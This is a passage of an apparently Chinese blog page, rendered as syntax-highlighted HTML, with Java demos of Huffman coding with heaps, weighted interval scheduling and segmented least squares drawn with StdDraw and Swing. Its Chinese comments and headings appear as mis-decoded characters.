class="hljs-number">0</span>];<br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//ä»ä¼˜å…ˆé˜Ÿåˆ—ä¸­å–å‡ºé¢‘ç‡æ¬¡å°çš„ç»“ç‚¹</span><br>            cHT[<span class="hljs-number">0</span>][n] = n;<br>            cHT[<span class="hljs-number">1</span>][n] = mF;<br>            cHT[<span class="hljs-number">2</span>][n] = mS;<br>            <span class="hljs-keyword">if</span> (cHT[<span class="hljs-number">3</span>][mF] &gt; cHT[<span class="hljs-number">3</span>][mS]) {<br>                cHT[<span class="hljs-number">3</span>][n] = cHT[<span class="hljs-number">3</span>][mF] + <span class="hljs-number">1</span>;<br>            }<br>            dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = f1 + f2;<br>            dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = n;<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>            insertHeap(dPS, dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]);<br>            <span class="hljs-comment">//æ–°ç»“ç‚¹åŠ å…¥ä¼˜å…ˆæ ‘</span><br>            root = n;<br>            n = n + <span class="hljs-number">1</span>;<br>            count = count - <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> zj,j;<br>        <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">1</span>){<br>            j=i/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]){<br>                zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>                zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>                insertHeap(dPS,j);<br>            }<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-type">int</span> left,right,zj;<br>        n=dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&gt;n)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&lt;n){<br>            left=<span class="hljs-number">2</span>*i;<br>            right=<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][left-<span class="hljs-number">1</span>]&gt;dPS[<span class="hljs-number">0</span>][right-<span class="hljs-number">1</span>]) {<br>                j = right;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                j = left;<br>            }<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n==<span class="hljs-number">2</span>*i){<br>            j=<span class="hljs-number">2</span>*i;<br>        }<br>        <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]){<br>            zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>            zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>            deleteHeap(dPS,j);<br>        }<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inOrderPaint</span><span class="hljs-params">(<span class="hljs-type">int</span> root, <span class="hljs-type">char</span>[] cS, <span class="hljs-type">int</span>[][] cHT, <span class="hljs-type">double</span> x, <span class="hljs-type">double</span> y, <span class="hljs-type">double</span> r, <span class="hljs-type">double</span> jg)</span> {<br>        <span class="hljs-type">double</span> xC,yC,xS,yS,rC,zj1,zj2;<br>        StdDraw.setPenColor(StdDraw.BLACK);<br>        StdDraw.circle(x,y,r);<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[1][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[2][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xS=x-<span class="hljs-number">0.05</span>*r;<br>            yS=y;<br>            String s=<span class="hljs-string">""</span>+cS[cHT[<span class="hljs-number">0</span>][root]];<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.text(xS,yS,s);<br>        }<br>    }<br>}<br><br><br></code></pre></td></tr></tbody></table></figure><h3 id="æ—¶éš™æœ€ä¼˜è§£æƒå€¼å’Œ"><a href="#æ—¶éš™æœ€ä¼˜è§£æƒå€¼å’Œ" class="headerlink" title="æ—¶éš™æœ€ä¼˜è§£æƒå€¼å’Œ"></a>æ—¶éš™æœ€ä¼˜è§£æƒå€¼å’Œ</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputeRDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{<br>        <span class="hljs-type">int</span> isN=<span class="hljs-number">10</span>,gis=<span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isM=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> beishu=gis;<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (c&lt;isN){<br>            <span class="hljs-type">int</span> d1=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d2=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d3=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d4=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-keyword">if</span>(d1&gt;d2){<br>                isS[c]=d2;<br>                isF[c]=d1;<br>                isF2[c]=d1;<br>                isV[c]=d4;<br>                isV2[c]=d4;<br>                flagX[c]=<span class="hljs-number">1</span>;<br>                c=c+<span class="hljs-number">1</span>;<br>            }<br>            }<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isR[i]=<span class="hljs-number">0</span>;<br>            isM[i]=-<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;isN;j++){<br>                <span class="hljs-keyword">if</span> (isF[i]==isF2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    isS2[i]=isS[j];<br>                    isV2[i]=isV[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span>[] isP=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isP[i]=-<span class="hljs-number">1</span>;<br>            isY2[i]=(<span class="hljs-type">int</span>)(beishu/isN*(isN-i)-<span class="hljs-number">0.5</span>);<br>            isSY[i]=isY2[i]-<span class="hljs-number">2</span>;<br>            isSX[i]=(<span class="hljs-type">int</span>)((isS2[i]+isF[i])/<span class="hljs-number">2</span>);<br>        }<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i-<span class="hljs-number">1</span>;j&gt;=<span class="hljs-number">0</span>;j--){<br>                <span class="hljs-keyword">if</span> (isS2[i]&gt;isF[j]){<br>                    isP[i]=j;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        computeOpt(isV2,isM,isP,isN-<span class="hljs-number">1</span>);<br>        findSolutions(isM,isV2,isR,isP,isN-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            StdDraw.setPenColor(StdDraw.BLUE);<br>            StdDraw.text(isSX[i],isSY[i],<span class="hljs-string">""</span>+isV2[i]);<br>            <span class="hljs-keyword">if</span> (isR[i]==<span class="hljs-number">1</span>){<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">computeOpt</span><span class="hljs-params">(<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span> {<br>        <span class="hljs-keyword">if</span> (j &lt;= -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, P[j]);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d2</span> <span class="hljs-operator">=</span> computeOpt(V, M, P, j - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((V[j] + d1) &lt; d2) {<br>                M[j]=d2;<br>                <span class="hljs-keyword">return</span> d2;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                M[j]=V[j]+d1;<br>                <span class="hljs-keyword">return</span> (V[j]+d1);<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findSolutions</span><span class="hljs-params">(<span class="hljs-type">int</span>[] M,<span class="hljs-type">int</span>[] V,<span class="hljs-type">int</span>[] R,<span class="hljs-type">int</span>[] P,<span class="hljs-type">int</span> j)</span>{<br>        <span class="hljs-type">int</span> i=j;<br>        <span class="hljs-type">int</span> d1,d2,d3=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&gt;=<span class="hljs-number">0</span>){<br>            <span class="hljs-keyword">if</span> (P[i]==-<span class="hljs-number">1</span>)<br>                d1=d3+V[i];<br>            <span class="hljs-keyword">else</span> {<br>                d1=d3+V[i]+M[P[i]];<br>            }<br>            <span class="hljs-keyword">if</span> (d1==M[j]){<br>                R[i]=<span class="hljs-number">1</span>;<br>                d3=d3+V[i];<br>                i=P[i];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                i=i-<span class="hljs-number">1</span>;<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="åˆ†æ®µæœ€å°äºŒä¹˜æ³•"><a href="#åˆ†æ®µæœ€å°äºŒä¹˜æ³•" class="headerlink" title="åˆ†æ®µæœ€å°äºŒä¹˜æ³•"></a>åˆ†æ®µæœ€å°äºŒä¹˜æ³•</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> javax.swing.JPanel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLMSDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JFrame</span>{<br>    <span class="hljs-comment">//16ä¸ªç‚¹çš„ç‚¹é›†ï¼Œç¬¬ä¸€è¡Œä¸ºæ¨ªåæ ‡ï¼Œç¬¬äºŒè¡Œä¸ºçºµåæ ‡</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> P[][]={{<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>,<span class="hljs-number">90</span>,<span class="hljs-number">100</span>,<span class="hljs-number">110</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">140</span>,<span class="hljs-number">150</span>,<span class="hljs-number">160</span>,<span class="hljs-number">170</span>,<span class="hljs-number">180</span>},<br>                {<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">34</span>,<span class="hljs-number">56</span>,<span class="hljs-number">77</span>,<span class="hljs-number">99</span>,<span class="hljs-number">118</span>,<span class="hljs-number">121</span>,<span class="hljs-number">124</span>,<span class="hljs-number">127</span>,<span class="hljs-number">128</span>,<span class="hljs-number">129</span>,<span class="hljs-number">131</span>}};<br>    <span class="hljs-comment">//åˆ†æ®µé™åˆ¶å‚æ•°Cï¼ŒCè¶Šå¤§ï¼Œåˆ†çš„æ®µæ•°è¶Šå°‘ï¼Œå¯é¿å…è¿‡æ‹Ÿåˆ</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> C=<span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//è®¾ç½®ä¸€ä¸ªæå¤§å€¼å¸¸é‡</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> MAXV=<span class="hljs-number">1000000000</span>;<br>    <span class="hljs-comment">//è®¾ç½®æœ€å¤§åˆ†æ®µæ•°</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> maxS=<span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//å®é™…åˆ†æ®µæ•°</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> mc=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//ç‚¹é›†å…±16ä¸ªç‚¹</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> n=<span class="hljs-number">16</span>;<br>    <span class="hljs-comment">//ä»1åˆ°j,j=1,2,...nçš„æœ€å°æ‹Ÿåˆè¯¯å·®,ä¸‹æ ‡0åšåˆå§‹å€¼ï¼Œå€¼ä¸º0</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[] optC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n+<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//æ¯ä¸ªå¯èƒ½çš„å­é›†çš„æ‹Ÿåˆç›´çº¿aå‚æ•°</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//æ¯ä¸ªå¯èƒ½çš„å­é›†çš„æœ€å°ä¹˜è¯¯å·®</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] eC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//æ¯ä¸ªå¯èƒ½çš„å­é›†çš„æ‹Ÿåˆç›´çº¿çš„bå‚æ•°</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//æœ€ä¼˜çš„åˆ†æ®µç»“æœï¼Œç¬¬ä¸€è¡Œè¯¥å­é›†çš„ç¬¬ä¸€ä¸ªç‚¹çš„ä¸‹æ ‡ï¼Œç¬¬äºŒè¡Œä¸ºè¯¥å­é›†çš„æœ€åä¸€ä¸ªç‚¹çš„ä¸‹æ ‡</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] mS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span 